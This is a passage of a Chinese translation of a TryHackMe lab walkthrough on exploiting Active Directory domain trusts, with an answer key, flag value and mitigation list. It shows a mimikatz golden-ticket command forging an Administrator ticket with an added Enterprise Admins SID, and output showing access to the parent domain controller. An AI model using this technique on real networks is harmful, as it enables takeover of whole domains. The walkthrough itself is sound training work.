style="color:#393A34"><span class="token plain">               7 File(s)      2,356,811 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               7 Dir(s)  50,913,189,888 bytes free;</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这至少确认了 Golden Ticket 是用于访问子域 DC 的伪造票证。然而，由于我们指定了额外的 SID，我们现在应该也可以访问父域 DC 了：</p>
<div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockTitle_Ktv7">Command Prompt</div><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">C:\&gt;dir \\thmrootdc.tryhackme.loc\c$\</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Volume in drive \\thmrootdc.tryhackme.loc\c$ is Windows</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Volume Serial Number is 1634-22A9</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Directory of \\thmrootdc.tryhackme.loc\c$</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">01/04/2022  08:47 AM               103 delete-vagrant-user.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">09/15/2018  08:19 AM    &lt;DIR&gt;          PerfLogs</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">03/21/2020  09:31 PM    &lt;DIR&gt;          Program Files</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">03/21/2020  09:25 PM    &lt;DIR&gt;          Program Files (x86)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/23/2022  09:21 AM                58 root_dns_entries.csv</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/23/2022  09:22 AM             1,432 thm-network-setup-dc.ps1</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/25/2022  05:50 PM    &lt;DIR&gt;          tmp</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  07:54 AM    &lt;DIR&gt;          Users</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/25/2022  05:50 PM    &lt;SYMLINKD&gt;     vagrant [\\vboxsvr\vagrant]</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">04/27/2022  06:29 PM    &lt;DIR&gt;          Windows</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               3 File(s)          1,593 bytes</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">               7 Dir(s)  51,105,730,560 bytes free</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div>
<p>这证实了我们现在完全威胁了父域，仅仅通过威胁其中一个子域！</p>
<div class="theme-admonition theme-admonition-info admonition_xJq3 alert alert--info"><div class="admonitionHeading_Gvgb"><span class="admonitionIcon_Rf37"><svg viewBox="0 0 14 16"><path fill-rule="evenodd" d="M7 2.3c3.14 0 5.7 2.56 5.7 5.7s-2.56 5.7-5.7 5.7A5.71 5.71 0 0 1 1.3 8c0-3.14 2.56-5.7 5.7-5.7zM7 1C3.14 1 0 4.14 0 8s3.14 7 7 7 7-3.14 7-7-3.14-7-7-7zm1 3H6v5h2V4zm0 6H6v2h2v-2z"></path></svg></span>Answer the questions below</div><div class="admonitionContent_BuS1"><p>父域和子域之间默认配置什么域信任关系？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Directional trust</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>AD KDC 用于加密和签署 TGT 的帐户名称是什么？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">KRBTGT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>TGT 授予对当前域之外的资源的访问权限的的名称是什么？</p><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">Inter-Realm TGT</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div><p>管理员桌面文件夹 (flag6.txt) 中 THMROOTDC 上存储的标志的值是多少？</p><details class="details_lb9f alert alert--info details_b_Ee" data-collapsed="true"><summary> 具体操作步骤 </summary><div><div class="collapsibleContent_i85q"><div class="language-shell codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-shell codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">mimikatz # kerberos::golden /user:Administrator /domain:za.tryhackme.loc /sid:S-1-5-21-3885271727-2693558621-2658995185-1001 /service:krbtgt /rc4:16f9af38fca3ada405386b3b57366082 /sids:S-1-5-21-3330634377-1326264276-632209373-519 /ptt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User      : Administrator</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Domain    : za.tryhackme.loc (ZA)</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">SID       : S-1-5-21-3885271727-2693558621-2658995185-1001</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">User Id   : 500</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Groups Id : *513 512 520 518 519</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Extra SIDs: S-1-5-21-3330634377-1326264276-632209373-519 ;</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">ServiceKey: 16f9af38fca3ada405386b3b57366082 - rc4_hmac_nt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Service   : krbtgt</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">Lifetime  : 12/12/2023 1:30:03 PM ; 12/9/2033 1:30:03 PM ; 12/9/2033 1:30:03 PM</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain">-&gt; Ticket : ** Pass TheTicket**</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * PAC generated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * PAC signed</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * EncTicketPart generated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * EncTicketPart encrypted</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> * KrbCred generated</span><br></span><span class="token-line" style="color:#393A34"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#393A34"><span class="token plain"> Golden ticket for &#x27;Administrator @ za.tryhackme.loc&#x27; successfully submitted for current session</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div></details><div class="language-plaintext codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#393A34;--prism-background-color:#f6f8fa"><div class="codeBlockContent_biex"><pre tabindex="0" class="prism-code language-plaintext codeBlock_bY9V thin-scrollbar" style="color:#393A34;background-color:#f6f8fa"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#393A34"><span class="token plain">THM{Full.EA.Compromise}</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="复制代码到剪贴板" title="复制" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="conclusion">Conclusion<a href="#conclusion" class="hash-link" aria-label="Conclusion的直接链接" title="Conclusion的直接链接">​</a></h2>
<p>利用 AD 需要时间去掌握，所使用的技术高 度依赖于被攻击的 AD 结构的配置。最重要的是要明白这个过程是循环的。在大多数情况下，我们不能运行一个单一的引导到根权限的攻击来获得域管理员权限。最佳方式是执行能够进一步提升你权限的利用方法，然后利用已经获得的权限再次进行枚举，寻找从这个新位置可能存在的额外攻击路径。</p>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="缓解措施">缓解措施<a href="#缓解措施" class="hash-link" aria-label="缓解措施的直接链接" title="缓解措施的直接链接">​</a></h3>
<p>AD 的利用，就像 AD 的枚举一样，非常难以防御。这是因为可能被视为可利用的配置错误实际上具有实际的业务用例。但是，我们可以采取一些措施来防止利用：</p>
<ul>
<li>我们需要确保没有任何配置会破坏我们的分层模型。低层级的帐户不应具有与高层级资源交互的能力。此外，来自高层级的帐户不应登录到低层级的资源上。</li>
<li>在执行权限委派时应遵循最小权限原则。此外，权限委派应符合分层模型，确保较低层级的对象不能更改较高层级的对象。</li>
<li>应强制执行 SMB 签名，而不仅仅是启用。这将阻止凭据中继尝试。</li>
<li>AD 对象及其配置并不是利用的唯一路径。AD 服务，如 AD CS，也应被视为攻击面的一部分并进行保护。</li>
<li>我们需要实施足够的安全控制来保护零级基础设施和我们子域中的帐户，因为其中一个的妥协可能导致整个林的妥协。</li>
</ul>
<p>AD 的利用已经完成，接下来的步骤是深入挖掘我们的根权限，以确保蓝队不能简单地清除我们的访问权限。这将在下一个环节中讨论。</p></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-edit-meta-row row"><div class="col"><a href="https://github.com/CTF-Archives/Tryhackme-CN/edit/main/docs/Modules/Compromising-Active-Directory/Exploiting-Active-Directory.md" target="_blank" rel="noopener noreferrer" class="theme-edit-this-page"><svg fill="currentColor" height="20" width="20" viewBox="0 0 40 40" class="iconEdit_Z9Sw" aria-hidden="true"><g><path d="m34.5 11.7l-3 3.1-6.3-6.3 3.1-3q0.5-0.5 1.2-0.5t1.1 0.5l3.9 3.9q0.5 0.4 0.5 1.1t-0.5 1.2z m-29.5 17.1l18.4-18.5 6.3 6.3-18.4 18.4h-6.3v-6.2z"></path></g></svg>编辑此页</a></div><div class="col lastUpdated_vwxv"></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="文件选项卡"><a class="pagination-nav__link pagination-nav__link--prev" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Lateral-Movement-and-Pivoting"><div class="pagination-nav__sublabel">上一页</div><div class="pagination-nav__label">Lateral Movement and Pivoting - 横向移动和枢纽</div></a><a class="pagination-nav__link pagination-nav__link--next" href="/TryHackMe-CN/docs/Modules/Compromising-Active-Directory/Persisting-Active-Directory"><div class="pagination-nav__sublabel">下一页</div><div class="pagination-nav__label">Persisting Active Directory - Active Directory 持久化</div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#introduction" class="table-of-contents__link toc-highlight">Introduction</a><ul><li><a href="#ad-利用" class="table-of-contents__link toc-highlight">AD 利用</a></li><li><a href="#学习目标" class="table-of-contents__link toc-highlight">学习目标</a></li><li><a href="#初始凭据" class="table-of-contents__link toc-highlight">初始凭据</a></li></ul></li><li><a href="#exploiting-permission-delegation---利用权限委派" class="table-of-contents__link toc-highlight">Exploiting Permission Delegation - 利用权限委派</a><ul><li><a href="#权限委派" class="table-of-contents__link toc-highlight">权限委派</a></li><li><a href="#利用-ace访问控制条目" class="table-of-contents__link toc-highlight">利用 ACE（访问控制条目）</a></li><li><a href="#bloodhound" class="table-of-contents__link toc-highlight">Bloodhound</a></li><li><a href="#权限提升" class="table-of-contents__link toc-highlight">权限提升</a></li><li><a href="#addmember---添加成员" class="table-of-contents__link toc-highlight">AddMember - 添加成员</a></li><li><a href="#强制更改密码" class="table-of-contents__link toc-highlight">强制更改密码</a></li></ul></li><li><a href="#exploiting-kerberos-delegation---利用-kerberos-委派" class="table-of-contents__link toc-highlight">Exploiting Kerberos Delegation - 利用 Kerberos 委派</a><ul><li><a href="#kerberos-委派" class="table-of-contents__link toc-highlight">Kerberos 委派</a></li><li><a href="#受约束与无约束" class="table-of-contents__link toc-highlight">受约束与无约束</a></li><li><a href="#基于资源的委派" class="table-of-contents__link toc-highlight">基于资源的委派</a></li><li><a href="#针对受限委托的利用" class="table-of-contents__link toc-highlight">针对受限委托的利用</a></li></ul></li><li><a href="#exploiting-automated-relays---利用自动中继" class="table-of-contents__link toc-highlight">Exploiting Automated Relays - 利用自动中继</a><ul><li><a href="#machine-账户" class="table-of-contents__link toc-highlight">Machine 账户</a></li><li><a href="#the-printer-bug---打印机错误" class="table-of-contents__link toc-highlight">The Printer Bug - 打印机错误</a></li><li><a href="#print-spooler-service---打印后台处理服务" class="table-of-contents__link toc-highlight">Print Spooler Service - 打印后台处理服务</a></li><li><a href="#smb-signing---smb-签名" class="table-of-contents__link toc-highlight">SMB Signing - SMB 签名</a></li><li><a href="#exploiting-authentication-relays---利用身份验证中继" class="table-of-contents__link toc-highlight">Exploiting Authentication Relays - 利用身份验证中继</a></li></ul></li><li><a href="#exploiting-ad-users---利用-ad-用户" class="table-of-contents__link toc-highlight">Exploiting AD Users - 利用 AD 用户</a><ul><li><a href="#用户和用户行为" class="table-of-contents__link toc-highlight">用户和用户行为</a></li><li><a href="#寻找凭证" class="table-of-contents__link toc-highlight">寻找凭证</a></li><li><a href="#system-有时特权太高" class="table-of-contents__link toc-highlight">SYSTEM 有时特权太高</a></li></ul></li><li><a href="#exploiting-gpos---利用-gpos" class="table-of-contents__link toc-highlight">Exploiting GPOs - 利用 GPOs</a><ul><li><a href="#组策略对象" class="table-of-contents__link toc-highlight">组策略对象</a></li><li><a href="#组策略管理" class="table-of-contents__link toc-highlight">组策略管理</a></li><li><a href="#利用-gpos" class="table-of-contents__link toc-highlight">利用 GPOs</a></li></ul></li><li><a href="#exploiting-certificates---利用证书" class="table-of-contents__link toc-highlight">Exploiting Certificates - 利用证书</a><ul><li><a href="#ad-证书服务" class="table-of-contents__link toc-highlight">AD 证书服务</a></li><li><a href="#查找易受攻击的证书模板" class="table-of-contents__link toc-highlight">查找易受攻击的证书模板</a></li><li><a href="#利用证书模板" class="table-of-contents__link toc-highlight">利用证书模板</a></li><li><a href="#通过证书模拟用户" class="table-of-contents__link toc-highlight">通过证书模拟用户</a></li></ul></li><li><a href="#exploiting-domain-trusts---利用域信任" class="table-of-contents__link toc-highlight">Exploiting Domain Trusts - 利用域信任</a><ul><li><a href="#域信任" class="table-of-contents__link toc-highlight">域信任</a></li><li><a href="#krbtgt-和黄金票据" class="table-of-contents__link toc-highlight">KRBTGT 和黄金票据</a></li><li><a href="#inter-realm-tgts---跨域-tgt" class="table-of-contents__link toc-highlight">Inter-Realm TGTs - 跨域 TGT</a></li><li><a href="#利用域信任" class="table-of-contents__link toc-highlight">利用域信任</a></li></ul></li><li><a href="#conclusion" class="table-of-contents__link toc-highlight">Conclusion</a><ul><li><a href="#缓解措施" class="table-of-contents__link toc-highlight">缓解措施</a></li></ul></li></ul></div></div></div></div></main></div></div></div><footer class="footer footer--dark"><div class="container container-fluid"><div class="footer__bottom text--center"><div class="footer__copyright">Copyright © 2023 Tryhackme CN Mirror Built with Docusaurus.</div></div></div></footer></div>
</body>
</html>